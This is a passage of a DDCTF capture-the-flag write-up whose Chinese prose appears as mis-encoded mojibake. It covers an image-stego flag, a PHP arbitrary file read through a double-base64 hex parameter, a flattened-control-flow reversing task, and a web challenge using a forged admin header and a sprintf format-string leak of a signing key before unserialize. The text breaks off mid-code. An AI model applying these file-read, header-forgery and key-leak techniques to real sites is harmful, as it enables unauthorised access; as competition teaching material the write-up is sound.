<p>åˆæ‰¾åˆ°äº†å¦å¤–ä¸¤å¼ å›¾ç‰‡ï¼Œå†…å®¹ä¸€æ ·ä½†æ˜¯å¤§å°ä¸åŒï¼Œå°†è¿™ä¸¤å¼ å›¾ç‰‡ä¼ åˆ°ä¹‹å‰çš„ç½‘ç«™ä¸Šè¿›è¡Œè§£å¯†ï¼Œä»è¾ƒå¤§çš„é‚£å¼ å›¾(1.9M å·¦å³)å–å¾— flag</p>
<p>flag:  DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}</p>
<h2 id="æ»´"><a href="#æ»´" class="headerlink" title="æ»´~"></a>æ»´~</h2><p>è§‚å¯Ÿ url</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</span><br></pre></td></tr></table></figure></div>

<p>å°† jpg å‚æ•°åé¢è·Ÿçš„å­—ç¬¦ä¸²è§£ç å¾—å‡ºå­—ç¬¦ä¸² flag.jpgï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¹Ÿè¦è¿›è¡Œ è½¬ 16 è¿›åˆ¶ -&gt; BASE64ENCODE -&gt; BASE64ENCODE æ‰è¡Œã€‚</p>
<p>å…ˆè¯»å–ä¸€ä¸‹ index.php çš„å†…å®¹</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="variable">$txt</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æ„æ€å¤§æ¦‚æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²åªèƒ½åŒ…å«å­—æ¯æ•°å­—å’Œå°æ•°ç‚¹ï¼Œå¹¶ä¸”å¦‚æœåŒ…å« config å­—ç¬¦ä¸²ï¼Œä¼šè¢«æ›¿æ¢æˆ !ã€‚</p>
<p>è®¿é—®ç»™å‡ºçš„åšå®¢ï¼ŒæŒ‰ç…§ä¸‹é¢çš„æ—¥æœŸæ‰¾åˆ°åšä¸»çš„ä¸€ç¯‡æ–‡ç« </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</span><br></pre></td></tr></table></figure></div>

<p>å°è¯•è®¿é—® practice.txt.swp å¾—åˆ°æç¤º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">f1ag!ddctf.php</span><br></pre></td></tr></table></figure></div>

<p>äºæ˜¯æ„é€  jpg å‚æ•°ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ä»£ç </p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uid</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$uid</span>==<span class="variable">$content</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å†æ„é€  url</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=f1ag!ddctf.php&amp;k=practice.txt.swp</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° flag:   DDCTF{436f6e67726174756c6174696f6e73}</p>
<h2 id="obfuscating-macros"><a href="#obfuscating-macros" class="headerlink" title="obfuscating macros"></a>obfuscating macros</h2><p>æ§åˆ¶æµå¹³å¦åŒ–çš„ä¸€é“é¢˜ç›®ï¼Œæ··æ·†äº†ä¸¤ä¸ªå‡½æ•°ã€‚</p>
<p>é¦–å…ˆå°è¯•ä½¿ç”¨ç§‘æ©å®éªŒå®¤ç»™çš„è„šæœ¬ deflat.pyï¼Œä½†æ˜¯åœ¨ç¬¦å·æ‰§è¡Œé˜¶æ®µä¼šå¡ä½ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ angr ç‰ˆæœ¬çš„é—®é¢˜ï¼Œä¿®å¤æ“ä½œå¤±è´¥ï¼Œä½†æ˜¯ä» IDA ä¸­çœ‹è¢«æ··æ·†çš„å‡½æ•°çš„ä¼ªä»£ç æ„Ÿè§‰çœŸæ­£çš„é€»è¾‘ä¸ä¼šå¤ªå¤æ‚ï¼Œäºæ˜¯é‡‡ç”¨è°ƒè¯•çš„æ–¹æ³•ï¼Œé€šè¿‡åœ¨ flag çš„ä½ç½®ä¸‹ç¡¬ä»¶æ–­ç‚¹æ¥è¿½è¸ªç¨‹åºæµç¨‹ã€‚</p>
<p>æ€»ç»“å‡ºä¸¤ä¸ªè¢«æ··æ·†çš„å‡½æ•°çš„æµç¨‹ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°é™åˆ¶è¾“å…¥å¿…é¡»æ˜¯åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œå’Œ Windows Reverse2 çš„ç®—æ³•ç±»ä¼¼ï¼Œä¹‹åä¼šå°†è¾“å…¥è½¬æ¢æˆçœŸæ­£çš„ 16 è¿›åˆ¶æ•°æ®ã€‚</p>
<p>ç¬¬äºŒä¸ªå‡½æ•°æ˜¯ä¸»è¦ç®—æ³•ï¼Œæµç¨‹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ£€æŸ¥ flag[0] æ˜¯å¦ç­‰äº 0ï¼Ÿ</span><br><span class="line">0x79 - flag[0] æ”¾åœ¨å¦ä¸€å—å†…å­˜ä¸­</span><br><span class="line">æ£€æŸ¥ ä¸Šä¸€æ­¥æ“ä½œç»“æœæ˜¯å¦ä¸ºé›¶</span><br><span class="line"></span><br><span class="line">å¾ªç¯ï¼Œå–å‡º flag[1] æ£€æŸ¥æ˜¯å¦ç­‰äº 0ï¼Ÿ</span><br><span class="line">0x40 - flag[0] æ”¾åœ¨å¦ä¸€å—å†…å­˜ä¸­</span><br><span class="line">æ£€æŸ¥ç»“æœæ˜¯å¦ä¸º 0ï¼Ÿ</span><br><span class="line">å‡½æ•°é€»è¾‘ä¸ºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦è¾¾åˆ°ç»“å°¾ï¼Œå¦‚æœæ˜¯åˆ™è·³å‡ºï¼Œå¦åˆ™è¿›è¡Œå‡æ³•æ“ä½œï¼Œè¦æ±‚è¾“å…¥å’Œç¨‹åºç¡¬ç¼–ç çš„å­—ç¬¦ä¸²ç›¸ç­‰ã€‚</span><br></pre></td></tr></table></figure></div>

<p>å°†ç¡¬ç¼–ç çš„å­—èŠ‚å…¨éƒ¨å–å‡ºå°±å¯ä»¥å¾—åˆ° flag</p>
<p>flag: 79406C61E5EEF319CECEE2ED8498 </p>
<h2 id="Web-ç­¾åˆ°é¢˜"><a href="#Web-ç­¾åˆ°é¢˜" class="headerlink" title="Web ç­¾åˆ°é¢˜"></a>Web ç­¾åˆ°é¢˜</h2><p>è¿›å»æç¤ºéœ€è¦å…ˆè·å–æƒé™ï¼Œåœ¨ JS ä¸­å‘ç°å¦‚ä¸‹ä»£ç </p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">auth</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;http://117.51.158.44/app/Auth.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">beforeSend</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) &#123;</span><br><span class="line">            <span class="title class_">XMLHttpRequest</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;didictf_username&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">getdata</span>) &#123;</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.<span class="property">data</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">               <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;auth&#x27;</span>).<span class="property">innerHTML</span> = getdata.<span class="property">data</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆå°±åœ¨ POST è¯·æ±‚å¤´æ·»åŠ ä¸€ä¸ª didictf_username å­—æ®µè¯•è¯•</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app\/fL2XID2i0Cdh.php</span><br></pre></td></tr></table></figure></div>

<p>æ‹¿åˆ°æºä»£ç </p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">url:app/Application.php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$errMsg</span> = <span class="string">&#x27;success&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&#x27;errMsg&#x27;</span> =&gt; <span class="variable">$errMsg</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>];</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$DIDICTF_ADMIN</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == <span class="variable">$DIDICTF_ADMIN</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="string">&#x27;æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="string">&#x27;æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizepath</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$path</span>) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>),<span class="string">&#x27;Congratulations&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">url:app/Session.php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;Application.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$eancrykey</span>                  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_expiration</span>			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_name</span>                = <span class="string">&#x27;ddctf_id&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_path</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_domain</span>				= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cookie_secure</span>				= <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$activity</span>                   = <span class="string">&quot;DiDiCTF&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parent</span>::<span class="title function_ invoke__">auth</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_key</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">session_read</span>()) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you %s&#x27;</span>;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$data</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">                <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">session_create</span>();</span><br><span class="line">                <span class="variable">$data</span> = <span class="string">&#x27;DiDI Welcome you&#x27;</span>;</span><br><span class="line">                <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eancrykey =  <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../config/key.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$session</span> = <span class="variable">$_COOKIE</span>[<span class="variable language_">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$session</span>)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&quot;session not found&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$session</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$session</span>)-<span class="number">32</span>);</span><br><span class="line">        <span class="variable">$session</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$session</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$session</span>)-<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$hash</span> !== <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;eancrykey.<span class="variable">$session</span>)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&quot;the cookie data not match&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$session</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$session</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$session</span>) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;session_id&#x27;</span>]) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>]) OR !<span class="keyword">isset</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="variable language_">$this</span>-&gt;eancrykey);</span><br><span class="line">            <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;ip_address&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&#x27;the ip addree not match&#x27;</span>.<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session</span>[<span class="string">&#x27;user_agent&#x27;</span>] != <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">response</span>(<span class="string">&#x27;the user agent not match&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$sessionid</span>) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="variable">$sessionid</span> .= <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">mt_getrandmax</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userdata</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;session_id&#x27;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="variable">$sessionid</span>,<span class="literal">TRUE</span>)),</span><br><span class="line">            <span class="string">&#x27;ip_address&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cookiedata</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$userdata</span>);</span><br><span class="line">        <span class="variable">$cookiedata</span> = <span class="variable">$cookiedata</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;eancrykey.<span class="variable">$cookiedata</span>);</span><br><span class="line">        <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;cookie_expiration + <span class="title function_ invoke__">time</span>();</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_name,</span><br><span class="line">            <span class="variable">$cookiedata</span>,</span><br><span class="line">            <span class="variable">$expire</span>,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="variable">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ddctf</span> = <span class="keyword">new</span> <span class="title class_">Session</span>();</span><br><span class="line"><span class="variable">$ddctf</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure></div>

<p>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">           <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="variable language_">$this</span>-&gt;eancrykey);</span><br><span class="line">           <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">               <span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span 